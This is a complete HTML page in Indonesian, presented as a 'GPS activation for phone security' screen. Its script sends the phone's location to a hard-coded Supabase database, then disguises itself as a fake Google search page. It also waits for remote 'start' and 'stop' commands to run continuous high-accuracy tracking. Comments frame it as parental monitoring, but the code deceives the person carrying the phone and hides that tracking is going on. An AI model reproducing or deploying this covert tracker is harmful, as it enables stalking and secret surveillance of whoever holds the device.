<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aktivasi GPS</title>
<link rel="manifest" href="manifest.json">
<meta name="theme-color" content="#667eea">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { 
    font-family: -apple-system, Segoe UI, Roboto, sans-serif; 
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    padding: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: background 0.5s ease;
  }
  .container { max-width: 400px; width: 100%; }
  .card { 
    background: white; 
    padding: 30px; 
    border-radius: 16px; 
    box-shadow: 0 10px 40px rgba(0,0,0,.2);
  }
  .logo { text-align: center; margin-bottom: 25px; }
  .logo-icon { font-size: 48px; margin-bottom: 10px; }
  h1 { color: #1a202c; font-size: 26px; font-weight: 700; }
  .subtitle { color: #e53e3e; font-size: 13px; margin-top: 5px; font-weight: 600; }
  button { 
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white; border: none; padding: 14px 20px; border-radius: 10px; 
    font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 12px;
  }
  button:hover { opacity: 0.9; }
  button:disabled { background: #cbd5e0; cursor: not-allowed; }
  input { 
    width: 100%; padding: 14px; border: 2px solid #e2e8f0; border-radius: 10px; 
    font-size: 16px; margin-top: 8px;
  }
  input:focus { outline: none; border-color: #667eea; }
  label { font-weight: 600; color: #2d3748; font-size: 14px; display: block; margin-top: 16px; }
  .status { padding: 14px; border-radius: 10px; margin-top: 16px; font-size: 14px; font-weight: 500; }
  .ok { background: #c6f6d5; color: #22543d; border-left: 4px solid #48bb78; }
  .err { background: #fed7d7; color: #742a2a; border-left: 4px solid #f56565; }
  .info { background: #bee3f8; color: #2a4365; border-left: 4px solid #4299e1; }
  .hidden { display: none !important; }
  .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
  .stat-box { background: #f7fafc; padding: 12px; border-radius: 8px; text-align: center; }
  .stat-label { font-size: 11px; color: #718096; text-transform: uppercase; }
  .stat-value { font-size: 18px; font-weight: 700; color: #2d3748; margin-top: 4px; }
  
  /* Mode Penyamaran - Reset tampilan body agar layar penuh */
  .stealth-mode { 
    background: white !important; 
    display: block !important;
    padding: 0 !important;
  }
</style>
</head>
<body>

<div class="container" id="appContainer">
  <div id="mainScreen" class="card">
    <div class="logo">
      <div class="logo-icon">📡</div>
      <h1>Aktivasi GPS</h1>
      <p class="subtitle">Demi Keamanan HP Aktifkan GPS</p>
    </div>
    
    <label>Nama Anda:</label>
    <input id="userName" type="text" placeholder="Masukkan nama">
    
    <button onclick="startActivation()" id="startBtn">🚀 Aktivasi GPS</button>
    
    <div id="statusBox" class="status info">Siap diaktifkan</div>
    
    <div class="stats hidden" id="statsBox">
      <div class="stat-box">
        <div class="stat-label">Status</div>
        <div class="stat-value" id="statStatus">-</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Terkirim</div>
        <div class="stat-value" id="statSent">0</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Akurasi</div>
        <div class="stat-value" id="statAcc">-</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Terakhir</div>
        <div class="stat-value" id="statTime" style="font-size:12px;">-</div>
      </div>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>
const SUPABASE_URL = 'https://vjqjuwmpsxgyyaksgpdy.supabase.co';
const SUPABASE_KEY = 'sb_publishable_8xAS-WIffN84TLFrBKZzJA_B3kpPc4V';

let sbClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

let watchId = null;
let sentCount = 0;
let currentName = '';
let channel = null;

async function startActivation() {
  const name = document.getElementById('userName').value.trim();
  if (!name) { alert('Masukkan nama Anda!'); return; }
  
  currentName = name.toLowerCase().replace(/\s+/g, '');
  
  if (!navigator.geolocation) {
    document.getElementById('statusBox').className = 'status err';
    document.getElementById('statusBox').textContent = '❌ GPS tidak tersedia di HP ini';
    return;
  }
  
  // Ubah UI menjadi status mendaftar
  document.getElementById('startBtn').style.display = 'none';
  document.getElementById('statsBox').classList.remove('hidden');
  document.getElementById('statStatus').textContent = 'MENDAFTAR';
  document.getElementById('statusBox').className = 'status info';
  document.getElementById('statusBox').textContent = '📍 Mendaftarkan perangkat ke server...';
  
  // 1. KIRIM 1 LOKASI PERTAMA SECARA PAKSA (Ping Pendaftaran)
  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      await sendLocation(pos.coords);
      // Jika berhasil kirim titik pertama, masuk ke mode menunggu (Standby)
      masukModeStandby(); 
    },
    (err) => {
      document.getElementById('statusBox').className = 'status err';
      document.getElementById('statusBox').textContent = '❌ Akses GPS Gagal / Ditolak';
      document.getElementById('startBtn').style.display = 'block';
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

function masukModeStandby() {
  // Ubah status UI
  document.getElementById('statStatus').textContent = 'STANDBY';
  document.getElementById('statusBox').className = 'status ok';
  document.getElementById('statusBox').textContent = '✅ Terdaftar! Menunggu pantauan ortu...';

  // 2. BUAT KONEKSI KE SERVER SUPABASE (BROADCAST)
  channel = sbClient.channel('koneksi-' + currentName);
  
  channel.on('broadcast', { event: 'perintah-ortu' }, (msg) => {
      console.log("Terima perintah:", msg.payload.aksi);
      if (msg.payload.aksi === 'MULAI') {
          startGPS();
      } else if (msg.payload.aksi === 'BERHENTI') {
          stopGPS();
      }
  }).subscribe((status) => {
      if (status === 'SUBSCRIBED') {
          // Kirim pancingan kalau-kalau ortu sudah standby di halaman map
          channel.send({ type: 'broadcast', event: 'ping-anak', payload: {} });
      }
  });

  // 3. SEMBUNYIKAN APLIKASI SETELAH 5 DETIK
  setTimeout(() => {
    document.body.className = 'stealth-mode'; 
    document.title = 'Google'; 
    
    document.body.innerHTML = `
      <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; width:100%; font-family: Arial, sans-serif;">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google" style="width: 272px; margin-bottom: 25px;">
        
        <div style="display:flex; align-items:center; border: 1px solid #dfe1e5; border-radius: 24px; padding: 10px 20px; width: 90%; max-width: 584px; box-shadow: 0 1px 6px rgba(32,33,36,.28);">
          <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="width:20px; color:#9aa0a6; margin-right:12px;">
            <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" fill="#9aa0a6"></path>
          </svg>
          <input type="text" style="border:none; outline:none; flex-grow:1; font-size:16px;" placeholder="Telusuri Google atau ketik URL">
          <svg focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:20px; margin-left:12px;">
            <path fill="#4285f4" d="m12 15c1.66 0 3-1.31 3-2.97v-7.02c0-1.66-1.34-3.01-3-3.01s-3 1.34-3 3.01v7.02c0 1.66 1.34 2.97 3 2.97z"></path>
            <path fill="#34a853" d="m11 18.08h2v3.92h-2z"></path>
            <path fill="#fbbc05" d="m7.05 16.87c-1.27-1.33-2.05-2.83-2.05-4.87h2c0 1.45 0.56 2.42 1.47 3.38v0.32l-1.15 1.18z"></path>
            <path fill="#ea4335" d="m12 16.93a4.97 5.25 0 0 1 -3.54 -1.55l-1.41 1.49c1.26 1.34 3.02 2.13 4.95 2.13 3.87 0 6.99-2.92 6.99-7h-1.99c0 2.92-2.24 4.93-5 4.93z"></path>
          </svg>
        </div>
      </div>
    `;
  }, 5000);
}

// FUNGSI NYALAKAN GPS (Hanya dipanggil saat ada sinyal MULAI dari Ortu)
function startGPS() {
  if (watchId) return; 
  
  console.log("Ortu sedang memantau, menyalakan GPS realtime!");
  watchId = navigator.geolocation.watchPosition(
    async (pos) => {
      await sendLocation(pos.coords);
    },
    (err) => {
      console.error('GPS Error:', err.message);
    },
    { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
  );
}

// FUNGSI MATIKAN GPS (Hanya dipanggil saat ada sinyal BERHENTI dari Ortu)
function stopGPS() {
  if (watchId) {
    navigator.geolocation.clearWatch(watchId);
    watchId = null;
    console.log("Ortu berhenti memantau, mematikan GPS untuk hemat baterai.");
  }
}

async function sendLocation(coords) {
  try {
    const { error } = await sbClient.from('locations').insert({
      family_code: currentName,
      lat: coords.latitude,
      lng: coords.longitude,
      accuracy: coords.accuracy
    });
    if (error) throw error;
    
    sentCount++;
    // Memperbarui UI stat hanya jika masih belum masuk mode penyamaran
    if(document.getElementById('statSent')) {
      document.getElementById('statSent').textContent = sentCount;
      document.getElementById('statAcc').textContent = Math.round(coords.accuracy) + 'm';
      document.getElementById('statTime').textContent = new Date().toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit'});
    }
  } catch (e) {
    console.error('Gagal kirim:', e);
  }
}
</script>
</body>
</html>
